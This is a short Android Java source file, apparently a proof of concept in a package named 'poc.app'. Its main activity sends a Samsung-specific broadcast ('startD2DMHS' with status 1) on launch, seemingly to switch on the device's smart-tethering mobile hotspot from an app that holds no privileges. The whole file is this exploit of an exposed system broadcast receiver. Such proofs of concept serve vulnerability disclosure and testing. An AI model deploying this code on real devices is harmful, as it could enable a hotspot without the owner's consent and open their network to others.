package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.android.server.wifi.softap.smarttethering.startD2DMHS");
        i.putExtra("status", 1);
        sendBroadcast(i);
    }
}